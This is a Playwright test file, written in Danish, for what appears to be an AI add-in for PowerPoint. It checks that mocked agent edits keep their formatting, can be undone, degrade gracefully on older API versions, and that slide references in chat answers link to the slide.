  await expect(show).toHaveCount(2);
  await show.nth(0).click();
  await show.nth(1).click();
  await expect
    .poll(() =>
      tp.page.evaluate(() =>
        (window as unknown as { __miai: { calls: { kind: string; address?: string }[] } }).__miai.calls
          .filter((c) => c.kind === "select")
          .map((c) => c.address),
      ),
    )
    .toEqual(["Ark1!C2:C5", "Ark1!A1:C5"]);
  expect(await sheet(tp.page)).toEqual(before);
});

type Deck = {
  id: string;
  layout: string;
  shapes: { name: string; text: string; style: Record<string, unknown>; marks: { start: number; end: number; bold?: boolean }[] }[];
}[];
const deck = (page: import("@playwright/test").Page) => page.evaluate(() => (window as unknown as { __miai: { deck: () => Deck } }).__miai.deck());
const withoutIds = (d: Deck) => d.map(({ id: _, ...rest }) => rest);

const SLIDES = [
  {
    layout: "Title Slide",
    shapes: [
      { name: "Title 1", ph: "Title", text: "Kvartalsrapport" },
      { name: "Subtitle 2", ph: "Subtitle", text: "Q3 2026" },
    ],
  },
  {
    layout: "Title and Content",
    shapes: [
      { name: "Title 1", ph: "Title", text: "Resultater" },
      {
        name: "Content 2",
        ph: "Body",
        text: "Omsætning +12 % i Q3\nMargin 38 %",
        style: { color: "#C00000", size: 24 },
        marks: [{ start: 0, end: 9, bold: true }],
      },
    ],
  },
  {
    layout: "Title and Content",
    shapes: [
      { name: "Title 1", ph: "Title", text: "Gammelt slide" },
      { name: "Content 2", ph: "Body", text: "Slet mig" },
    ],
  },
];
const LAYOUTS = [
  { name: "Title Slide", placeholders: ["Title", "Subtitle"] },
  { name: "Title and Content", placeholders: ["Title", "Body"] },
];

test("PowerPoint: kun det ændrede ændres, nye slides følger skabelonen, og fortryd lægger slides tilbage med formatering", async ({ open }) => {
  const tp = await open({ host: "PowerPoint", apiSets: { PowerPointApi: "1.8" }, slides: SLIDES, layouts: LAYOUTS });
  const original = await deck(tp.page);
  tp.model.reply = () => ({
    json: JSON.stringify({
      summary: "Opdaterer tallet, tilføjer næste skridt og rydder op.",
      actions: [
        { action: "replace", find: "+12 % i Q3", replace: "+14 % i Q3", reason: "Nyt tal" },
        { action: "setText", shape: "1.2", text: "Q3 2026 – **foreløbig**", reason: "Status" },
        { action: "addSlide", after: 2, layout: "Title and Content", title: "Næste skridt", body: "- Godkend budget\n- Ansæt to", reason: "Opfølgning" },
        { action: "deleteSlide", slide: 3, reason: "Forældet" },
        { action: "moveSlide", slide: 2, to: 1, reason: "Resultater først" },
      ],
    }),
  });
  await tp.run("Agent: redigér dokumentet");
  await expect(tp.page.getByText("Foreslåede handlinger")).toBeVisible();
  const prompt = tp.model.lastRequest!.messages.map((m) => m.content).join("\n");
  expect(prompt).toContain(
    "Slide 2 (layout: Title and Content)\n  2.1 [title] Title 1: Resultater\n  2.2 [body] Content 2: Omsætning +12 % i Q3 ⏎ Margin 38 %",
  );
  expect(prompt).toContain("Layouts: Title Slide | Title and Content");
  await expect(tp.page.getByRole("checkbox", { name: "Ny tekst i Subtitle 2 (slide 1): “Q3 2026 – foreløbig”" })).toBeChecked();

  await tp.page.getByRole("button", { name: "Udfør 5 handlinger" }).click();
  await expect(tp.page.getByText("5 af 5 handlinger udført.")).toBeVisible();
  const d = await deck(tp.page);
  expect(d.map((s) => s.shapes[0].text)).toEqual(["Resultater", "Kvartalsrapport", "Næste skridt"]);
  // Erstat: kun tallet er skiftet; "Omsætning" er stadig fed, og figurens skabelonformat er urørt.
  expect(d[0].shapes[1]).toMatchObject({
    text: "Omsætning +14 % i Q3\nMargin 38 %",
    style: { color: "#C00000", size: 24 },
    marks: [{ start: 0, end: 9, bold: true }],
  });
  // Ny tekst: fed på det markerede ord.
  expect(d[1].shapes[1]).toMatchObject({ text: "Q3 2026 – foreløbig", marks: [{ start: 10, end: 19, bold: true }] });
  // Nyt slide fra layoutet: teksten står i layoutets pladsholdere (ingen egne tekstbokse), punkttegn fra layoutet.
  expect(d[2]).toMatchObject({ layout: "Title and Content" });
  expect(d[2].shapes.map((s) => [s.text, s.style])).toEqual([
    ["Næste skridt", { fromLayout: "Title and Content" }],
    ["Godkend budget\nAnsæt to", { fromLayout: "Title and Content" }],
  ]);

  await expect(tp.page.getByText(/lægger de berørte slides tilbage med deres formatering/)).toBeVisible();
  await tp.page.getByRole("button", { name: "Fortryd agent-session" }).click();
  await expect(tp.page.getByText("Agent-sessionen er fortrudt.")).toBeVisible();
  expect(withoutIds(await deck(tp.page))).toEqual(withoutIds(original));
});

test("PowerPoint før 1.8: slides slettes ikke (kan ikke fortrydes), og fortryd siger, at kun teksten gendannes", async ({ open }) => {
  const tp = await open({ host: "PowerPoint", apiSets: { PowerPointApi: "1.4" }, slides: SLIDES, layouts: LAYOUTS });
  tp.model.reply = () => ({
    json: JSON.stringify({
      summary: "",
      actions: [
        { action: "replace", find: "Q3 2026", replace: "Q4 2026", reason: "" },
        { action: "deleteSlide", slide: 3, reason: "" },
      ],
    }),
  });
  await tp.run("Agent: redigér dokumentet");
  await tp.page.getByRole("button", { name: "Udfør 2 handlinger" }).click();
  await expect(tp.page.getByText("1 af 2 handlinger udført.")).toBeVisible();
  await expect(tp.page.getByText(/Sletning af slides kræver en nyere PowerPoint/)).toBeVisible();
  expect((await deck(tp.page)).length).toBe(3);
  await expect(tp.page.getByText(/kan kun gendanne teksten/)).toBeVisible();
  await tp.page.getByRole("button", { name: "Fortryd agent-session" }).click();
  await expect(tp.page.getByText("Agent-sessionen er fortrudt.")).toBeVisible();
  expect((await deck(tp.page))[0].shapes[1].text).toBe("Q3 2026");
});

test("PowerPoint (#22): 'slide 2' i et chatsvar kan klikkes og går til sliden", async ({ open }) => {
  const tp = await open({ host: "PowerPoint", apiSets: { PowerPointApi: "1.8" }, slides: SLIDES });
  tp.model.reply = () => ({ stream: ["Prisen står på slide 2, og slideshowet har i alt to slides."] });
  await tp.tab("Chat");
  await tp.page.getByPlaceholder("Spørg om dit dokument…").fill("Hvor står prisen?");
  await tp.page.keyboard.press("Enter");
  await expect(tp.page.locator("button.docref")).toHaveText(["slide 2"]);
  await tp.page.getByRole("button", { name: "slide 2" }).click();
  await expect.poll(async () => (await tp.find<{ id: number; type: string }>("goTo")) ?? null).toMatchObject({ id: 2, type: "Index" });
});
